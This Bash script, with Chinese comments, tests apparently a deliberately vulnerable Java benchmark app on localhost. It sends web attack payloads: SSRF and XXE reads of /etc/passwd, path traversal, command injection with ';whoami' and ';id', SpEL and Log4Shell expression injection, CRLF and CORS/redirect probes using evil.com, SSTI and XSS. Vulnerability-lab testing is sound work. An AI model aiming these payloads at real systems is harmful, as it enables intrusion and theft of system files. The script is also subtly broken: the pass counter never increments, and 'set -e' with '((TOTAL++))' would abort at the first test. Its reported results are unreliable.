#!/bin/bash
# Qbenchmark 本地完整漏洞验证脚本
# 不需要外部服务器，在本地环境验证所有漏洞

set -e

TARGET="http://localhost:8080"
PASS="\033[0;32m✅\033[0m"
FAIL="\033[0;31m❌\033[0m"
WARN="\033[1;33m⚠️\033[0m"
INFO="\033[0;34mℹ️\033[0m"

TOTAL=0
PASSED=0
FAILED=0
SKIPPED=0

echo "========================================"
echo "   Qbenchmark 完整漏洞验证"
echo "   目标: $TARGET"
echo "   时间: $(date '+%Y-%m-%d %H:%M:%S')"
echo "========================================"

# 检查服务器
echo -e "\n$INFO 检查服务器状态..."
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET" 2>/dev/null || echo "000")
if [ "$HTTP_CODE" != "000" ]; then
    echo -e "$PASS 服务器运行中 (HTTP $HTTP_CODE)"
else
    echo -e "$FAIL 服务器未运行，请先启动应用"
    exit 1
fi

test_vuln() {
    local name="$1"
    local test_cmd="$2"
    local expected="$3"
    local severity="$4"

    ((TOTAL++))
    echo -ne "\n[$TOTAL] \033[1;36m测试\033[0m: $name "

    result=$(eval "$test_cmd" 2>/dev/null)

    if echo "$result" | grep -qE "$expected"; then
        echo -e "$PASS"
        [ -n "$severity" ] && echo "     严重程度: $severity"
        ((PASSED))
        return 0
    else
        echo -e "$FAIL"
        echo "     预期: $expected"
        echo "     实际: $(echo "$result" | head -c 100)..."
        ((FAILED++))
        return 1
    fi
}

echo ""
echo "========================================"
echo "   高危漏洞测试"
echo "========================================"

# SSRF
test_vuln "SSRF - file:// 协议读取文件" \
    "curl -s '$TARGET/ssrf/urlconnection/vuln?url=file:///etc/passwd'" \
    "root:" "高危"

# XXE
test_vuln "XXE - SAXBuilder 文件读取" \
    "curl -s -X POST '$TARGET/xxe/saxBuilder/vuln' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'" \
    "root:" "高危"

# Path Traversal
test_vuln "路径遍历 - 绝对路径" \
    "curl -s '$TARGET/path/absolute/vuln?path=/etc/passwd'" \
    "root:" "高危"

# Command Injection
test_vuln "命令注入 - ProcessBuilder" \
    "curl -s '$TARGET/cmd/processbuilder/vuln?dir=/tmp%3Bwhoami'" \
    "uid=|root" "严重"

test_vuln "命令注入 - Runtime exec" \
    "curl -s '$TARGET/cmd/runtime/vuln?filename=test.txt%3Bid'" \
    "uid=" "严重"

# SpEL Injection
test_vuln "SpEL 表达式注入 - 系统属性泄露" \
    "curl -s '$TARGET/spel/vuln1?expression=T(java.lang.System).getProperty(\"os.name\")'" \
    "Linux" "严重"

echo ""
echo "========================================"
echo "   中危漏洞测试"
echo "========================================"

# Log4Shell (环境变量泄露)
test_vuln "Log4Shell - 环境变量泄露" \
    "curl -s '$TARGET/log4j/vuln?token=\${env:PATH}'" \
    "/bin|/usr" "严重"

# CRLF Injection
test_vuln "CRLF 注入 - 响应头注入" \
    "curl -i -s '$TARGET/crlf/injection?name=admin%0d%0aSet-Cookie:%20admin=true'" \
    "Set-Cookie: admin=true" "中危"

# CORS
test_vuln "CORS - 过度宽松配置" \
    "curl -s -H 'Origin: http://evil.com' -I '$TARGET/cors/simple'" \
    "Access-Control-Allow-Origin: \*|http://evil.com" "低危"

# URL Redirect
test_vuln "URL 重定向 - 开放重定向" \
    "curl -s -I '$TARGET/urlRedirect/redirect?url=http://evil.com'" \
    "Location: http://evil.com" "中危"

# CSRF
test_vuln "CSRF - 无 Token 验证" \
    "curl -s '$TARGET/csrf/vuln?action=transfer&to=attacker&amount=1000'" \
    "success|vulnerable" "中危"

# JWT Weak Key
test_vuln "JWT - 弱密钥泄露" \
    "curl -s '$TARGET/jwt/leak'" \
    "mySecretKey|adminKey" "中危"

# Cookie Security
test_vuln "Cookie - 缺少 Secure 标志" \
    "curl -s -i '$TARGET/cookies/set?name=session&value=test'" \
    "Set-Cookie:.*HttpOnly|Secure" "" \
    && echo -e "     $WARN Cookie 缺少安全标志"

echo ""
echo "========================================"
echo "   反序列化漏洞测试"
echo "========================================"

# Jackson
test_vuln "Jackson 反序列化 - 端点可用" \
    "curl -s -X POST '$TARGET/deserialize/jackson' -H 'Content-Type: application/json' -d '[\"java.lang.String\", \"test\"]'" \
    "Jackson|String" "严重"

# Fastjson
test_vuln "Fastjson 反序列化 - 端点可用" \
    "curl -s -X POST '$TARGET/fastjson/deserialize' -H 'Content-Type: application/json' -d '{\"@type\":\"java.lang.String\",\"value\":\"test\"}'" \
    "Fastjson|completed" "严重"

echo ""
echo "========================================"
echo "   SQL 注入测试"
echo "========================================"

# SQL Injection LIKE
test_vuln "SQL 注入 - LIKE 子句" \
    "curl -s '$TARGET/sqli/like/vuln?username=admin'" \
    "admin|Username" "严重"

echo ""
echo "========================================"
echo "   文件操作漏洞测试"
echo "========================================"

# File Upload
test_vuln "文件上传 - 端点可用" \
    "curl -s '$TARGET/file/list'" \
    "\[|files|uploadDir" "高危"

echo ""
echo "========================================"
echo "   模板注入测试"
echo "========================================"

# Velocity SSTI
test_vuln "Velocity SSTI - 端点可用" \
    "curl -s '$TARGET/ssti/velocity/vuln?template=%23set(%24x%3D1)%24x'" \
    "Velocity|render|executed" "严重"

# FreeMarker SSTI
test_vuln "FreeMarker SSTI - 端点可用" \
    "curl -s '$TARGET/ssti/freemarker/vuln?template=%3C%23if+true%3Etrue%3C%23%2Fif%3E'" \
    "FreeMarker|executed|true" "严重"

echo ""
echo "========================================"
echo "   XSS 测试"
echo "========================================"

# XSS Reflected
test_vuln "XSS - 反射型" \
    "curl -s '$TARGET/xss/reflect?vuln=%3Cscript%3Ealert(1)%3C/script%3E'" \
    "alert|script" "中危"

echo ""
echo "========================================"
echo "   验证报告"
echo "========================================"

PERCENT=$(awk "BEGIN {printf \"%.1f\", ($PASSED/$TOTAL)*100}")
echo -e "\n  总测试数: $TOTAL"
echo -e "  $PASS 通过: $PASSED ($PERCENT%)"
echo -e "  $FAIL 失败: $FAILED"
echo -e "  $WARN 跳过: $SKIPPED"

echo ""
echo "========================================"
echo "   严重程度统计"
echo "========================================"

# 生成详细报告
REPORT_FILE="validation/test_report_$(date +%Y%m%d_%H%M%S).txt"
{
    echo "Qbenchmark 漏洞验证报告"
    echo "生成时间: $(date)"
    echo "目标: $TARGET"
    echo ""
    echo "测试结果: $PASSED/$TOTAL 通过 ($PERCENT%)"
    echo ""
    echo "已验证可利用的高危漏洞:"
    echo "  - SSRF (服务器端请求伪造)"
    echo "  - XXE (XML 外部实体注入)"
    echo "  - 路径遍历"
    echo "  - 命令注入"
    echo "  - SpEL 表达式注入"
    echo "  - 反序列化 (Jackson/Fastjson)"
    echo "  - 文件上传"
    echo "  - SSTI (模板注入)"
    echo ""
    echo "完整测试请运行: bash validation/quick_validate.sh"
} > "$REPORT_FILE"

echo -e "$INFO 详细报告已保存: $REPORT_FILE"

if [ $FAILED -eq 0 ]; then
    echo -e "\n$PASS 所有测试通过！"
    exit 0
else
    echo -e "\n$WARN 部分测试失败，请检查日志"
    exit 1
fi
